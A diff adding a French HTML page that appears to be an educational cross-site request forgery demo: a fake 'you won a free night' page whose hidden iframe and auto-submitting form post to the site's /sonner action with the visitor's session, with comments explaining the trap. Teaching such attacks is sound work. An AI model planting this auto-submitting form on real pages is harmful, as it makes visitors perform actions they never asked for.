@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Auberge Rivale</title>
+  <link rel="stylesheet" href="/theme.css" /><link rel="stylesheet" href="/page.css" />
+</head>
+<body>
+  <main class="salle">
+    <section class="panneau">
+      <h1 class="titre-page" style="color:var(--mousse)">Auberge Rivale</h1>
+      <p>Felicitations voyageur ! Tu as gagne une nuit gratuite. Reste un instant, on prepare ton bon...</p>
+      <p class="note-discrete">(Pendant que tu lis cette page, regarde ce qui se passe a l'auberge.)</p>
+      <a class="lien-retour" href="/">Revenir a l'Auberge du Pixel</a>
+    </section>
+  </main>
+
+  <!-- La page piegee declenche l'action /sonner dans une iframe cachee, -->
+  <!-- en utilisant ta session, sans que tu aies rien demande. -->
+  <iframe name="cible-cachee" style="display:none" title="cachee"></iframe>
+  <form id="piege" method="POST" action="/sonner" target="cible-cachee"></form>
+  <script>document.getElementById('piege').submit();</script>
+</body>
+</html>
